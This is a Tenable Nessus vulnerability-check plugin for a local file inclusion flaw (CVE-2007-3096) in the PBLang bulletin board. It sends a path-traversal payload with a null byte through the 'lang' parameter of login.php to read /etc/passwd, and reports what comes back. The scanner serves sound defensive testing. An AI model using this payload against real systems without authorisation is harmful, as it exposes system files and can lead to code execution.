#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(25444);
  script_version("$Revision: 1.15 $");

  script_cve_id("CVE-2007-3096");
  script_bugtraq_id(24340);
  script_osvdb_id(36985);
  script_xref(name:"EDB-ID", value:"4036");

  script_name(english:"PBLang login.php lang Parameter Local File Inclusion");
  script_summary(english:"Tries to read a local file with PBLang");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP script that is susceptible to a
local file include attack." );
 script_set_attribute(attribute:"description", value:
"The remote host is running PBLang, a bulletin board system that uses
flat files and is written in PHP. 

The version of PBLang installed on the remote host fails to sanitize
user input to the 'lang' parameter before using it to include PHP code
in 'login.php'.  Regardless of PHP's 'register_globals' setting, an
unauthenticated, remote attacker may be able to exploit this issue to
view arbitrary files or to execute arbitrary PHP code on the remote
host, subject to the privileges of the web server user id." );
 script_set_attribute(attribute:"solution", value:
"Unknown at this time." );
  script_set_cvss_base_vector("CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P");
  script_set_cvss_temporal_vector("CVSS2#E:POC/RL:U/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
 script_set_attribute(attribute:"plugin_publication_date", value: "2007/06/07");
 script_set_attribute(attribute:"vuln_publication_date", value: "2007/06/06");
 script_cvs_date("$Date: 2016/05/20 14:21:44 $");
script_set_attribute(attribute:"plugin_type", value:"remote");
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2007-2016 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);
  script_require_keys("www/PHP");
  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


port = get_http_port(default:80, embedded: 0);
if (!can_host_php(port:port)) exit(0);


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/pblang", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  # Try to retrieve a local file.
  file = "/../../../../../../../../../../../../etc/passwd%00";
  r = http_send_recv3(method:"GET", item:string(dir, "/login.php?","lang=", file), port:port
  );
  if (isnull(r)) exit(0);
  res = r[2];

  # There's a problem if...
  if (
    # it looks like PBLang and...
    "PBLang " >< res &&
    (
      # there's an entry for root or...
      egrep(pattern:"root:.*:0:[01]:", string:res) ||
      # we get an error saying "failed to open stream" or...
      egrep(pattern:"main\(.+/etc/passwd\\0\.php.+ failed to open stream", string:res) ||
      # we get an error claiming the file doesn't exist or...
      egrep(pattern:"main\(.+/etc/passwd\).*: failed to open stream: No such file", string:res) ||
      # we get an error about open_basedir restriction.
      egrep(pattern:"main.+ open_basedir restriction in effect. File\(.+/etc/passwd", string:res)
    )
  )
  {
    if (egrep(string:res, pattern:"root:.*:0:[01]:"))
      contents = res - strstr(res, "<!DOCTYPE");
    else contents = "";

    if (contents)
    {
      report = string(
        "\n",
        "Here are the contents of the file '/etc/passwd' that Nessus\n",
        "was able to read from the remote host :\n",
        "\n",
        contents
      );
      security_warning(port:port, extra:report);
    }
    else security_warning(port);

    exit(0);
  }
}
